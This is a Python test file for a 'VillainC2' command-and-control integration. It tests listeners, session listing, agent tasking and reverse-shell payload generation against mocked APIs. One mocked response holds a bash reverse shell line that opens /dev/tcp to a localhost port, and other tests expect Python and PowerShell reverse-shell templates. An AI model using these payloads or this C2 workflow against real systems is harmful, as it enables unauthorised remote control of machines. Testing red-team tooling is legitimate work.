"""Tests VillainC2 — reverse shell handler multi-session + TeamServer."""
from __future__ import annotations

import json
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from c2_manager.integrations.villain import VillainC2
from c2_manager.models import C2Config, C2Type, C2Status
from c2_manager.models.payload import PayloadConfig
from tests.c2_manager.conftest import make_resp


@pytest.fixture
def villain_rest_config() -> C2Config:
    return C2Config(
        name="test-villain-rest",
        c2_type=C2Type.VILLAIN,
        host="127.0.0.1",
        port=8888,
        extra={"mode": "rest", "api_key": "villain-key", "verify_ssl": False},
    )


@pytest.fixture
def villain_ts_config() -> C2Config:
    return C2Config(
        name="test-villain-ts",
        c2_type=C2Type.VILLAIN,
        host="127.0.0.1",
        port=65001,
        password="villain-pass",
        extra={"mode": "teamserver", "ts_port": 65001},
    )


@pytest.fixture
def villain_rest(villain_rest_config):
    v = VillainC2()
    v._config = villain_rest_config
    v._status = C2Status.CONNECTED
    v._mode   = "rest"
    v._client = AsyncMock()
    v._token  = "villain-key"
    return v


@pytest.fixture
def villain_ts(villain_ts_config):
    v = VillainC2()
    v._config     = villain_ts_config
    v._status     = C2Status.CONNECTED
    v._mode       = "teamserver"
    v._ts_reader  = AsyncMock()
    v._ts_writer  = AsyncMock()
    v._ts_writer.is_closing = MagicMock(return_value=False)
    return v


# ── Connexion REST ────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_connect_rest(villain_rest_config):
    v = VillainC2()
    with patch("httpx.AsyncClient") as mock_cls:
        mock_client = AsyncMock()
        mock_client.get = AsyncMock(return_value=make_resp(200, {"status": "ok"}))
        mock_cls.return_value = mock_client
        result = await v._connect_rest(villain_rest_config)
    assert result is True
    assert v._status == C2Status.CONNECTED


# ── TeamServer protocol ───────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_ts_call(villain_ts):
    """_ts_call envoie JSON + lit la réponse."""
    resp_data = json.dumps({"status": "ok", "sessions": []}).encode() + b"\x00"
    villain_ts._ts_reader.readuntil = AsyncMock(return_value=resp_data)
    villain_ts._ts_writer.write  = MagicMock()
    villain_ts._ts_writer.drain  = AsyncMock()

    resp = await villain_ts._ts_call({"action": "get_sessions"})
    assert resp["status"] == "ok"


# ── Listeners ─────────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_create_listener_rest(villain_rest):
    villain_rest._client.post = AsyncMock(return_value=make_resp(201, {
        "id": "l-1", "active": True,
    }))
    listener = await villain_rest.create_listener({
        "protocol": "tcp",
        "bind_host": "0.0.0.0",
        "bind_port": 6666,
        "name": "tcp-6666",
    })
    assert listener.id == "l-1"
    assert listener.bind_port == 6666


@pytest.mark.asyncio
async def test_create_listener_teamserver(villain_ts):
    resp_data = json.dumps({"status": "ok", "id": "ts-l1"}).encode() + b"\x00"
    villain_ts._ts_reader.readuntil = AsyncMock(return_value=resp_data)
    villain_ts._ts_writer.write  = MagicMock()
    villain_ts._ts_writer.drain  = AsyncMock()
    listener = await villain_ts.create_listener({
        "protocol": "tcp", "bind_port": 6666, "name": "ts-listener",
    })
    assert listener.id == "ts-l1"
    assert listener.status == "running"


@pytest.mark.asyncio
async def test_list_listeners_rest(villain_rest):
    villain_rest._client.get = AsyncMock(return_value=make_resp(200, {
        "listeners": [
            {"id": "l1", "name": "tcp-6666", "host": "0.0.0.0",
             "port": 6666, "type": "tcp", "active": True},
        ]
    }))
    listeners = await villain_rest.list_listeners()
    assert len(listeners) == 1
    assert listeners[0].bind_port == 6666


@pytest.mark.asyncio
async def test_remove_listener_rest(villain_rest):
    villain_rest._client.delete = AsyncMock(return_value=make_resp(204, {}))
    result = await villain_rest.remove_listener("l1")
    assert result is True


# ── Agents (sessions) ─────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_list_agents_rest(villain_rest):
    villain_rest._client.get = AsyncMock(return_value=make_resp(200, {
        "sessions": [
            {
                "id": "s1", "hostname": "ubuntu-pc",
                "username": "root", "remote_ip": "10.0.0.10",
                "os": "Linux", "shell_type": "bash",
                "last_active": "2024-01-15T12:00:00",
                "connected_at": "2024-01-15T10:00:00",
                "dead": False, "is_root": True,
            }
        ]
    }))
    agents = await villain_rest.list_agents()
    assert len(agents) == 1
    assert agents[0].hostname == "ubuntu-pc"
    assert agents[0].integrity == "SYSTEM"


@pytest.mark.asyncio
async def test_parse_session_non_root(villain_rest):
    villain_rest._client.get = AsyncMock(return_value=make_resp(200, {
        "sessions": [
            {"id": "s2", "hostname": "win-pc", "username": "alice",
             "is_root": False, "dead": False,
             "last_active": "2024-01-15T12:00:00"}
        ]
    }))
    agents = await villain_rest.list_agents()
    assert agents[0].integrity == "USER"


# ── Tasks ─────────────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_send_task_rest(villain_rest):
    villain_rest._client.post = AsyncMock(return_value=make_resp(201, {
        "task_id": "t-1", "status": "queued",
    }))
    task = await villain_rest.send_task("s1", "id", [])
    assert task.agent_id == "s1"


@pytest.mark.asyncio
async def test_send_task_teamserver(villain_ts):
    resp_data = json.dumps({"status": "ok", "output": "root", "task_id": "ts-t1"}).encode() + b"\x00"
    villain_ts._ts_reader.readuntil = AsyncMock(return_value=resp_data)
    villain_ts._ts_writer.write  = MagicMock()
    villain_ts._ts_writer.drain  = AsyncMock()
    task = await villain_ts.send_task("s1", "id", [])
    assert task.status == "completed"
    assert task.result == "root"


@pytest.mark.asyncio
async def test_get_task_result_rest(villain_rest):
    villain_rest._client.get = AsyncMock(return_value=make_resp(200, {
        "status": "completed", "output": "root\n",
    }))
    result = await villain_rest.get_task_result("t-1")
    assert result["status"] == "completed"


# ── Payload ───────────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_generate_payload_bash(villain_rest):
    villain_rest._client.post = AsyncMock(return_value=make_resp(200, {
        "payload": "bash -i >& /dev/tcp/127.0.0.1/6666 0>&1",
    }))
    payload_cfg = PayloadConfig(
        name="bash-revshell",
        format="bash",
        extra={"shell_type": "bash", "callback_host": "127.0.0.1", "callback_port": 6666},
    )
    payload = await villain_rest.generate_payload(payload_cfg)
    assert b"bash" in payload


@pytest.mark.asyncio
async def test_generate_payload_local_template(villain_rest):
    """Sans réponse API → template local."""
    villain_rest._client.post = AsyncMock(return_value=make_resp(200, {"payload": ""}))
    payload_cfg = PayloadConfig(
        name="python-revshell",
        format="python",
        extra={"shell_type": "python", "callback_host": "127.0.0.1", "callback_port": 4444},
    )
    payload = await villain_rest.generate_payload(payload_cfg)
    assert b"python" in payload or b"socket" in payload


@pytest.mark.asyncio
async def test_generate_payload_powershell_template(villain_rest):
    """Template PowerShell local."""
    villain_rest._client.post = AsyncMock(return_value=make_resp(200, {}))
    payload_cfg = PayloadConfig(
        name="ps1-revshell",
        format="powershell",
        extra={"shell_type": "powershell", "callback_host": "127.0.0.1", "callback_port": 4444},
    )
    payload = await villain_rest.generate_payload(payload_cfg)
    assert b"TCPClient" in payload or b"powershell" in payload.lower()


# ── Guard ─────────────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_require_connected_guard(villain_rest):
    from c2_manager.interfaces import C2NotConnected
    villain_rest._status = C2Status.DISCONNECTED
    with pytest.raises(C2NotConnected):
        await villain_rest.list_agents()
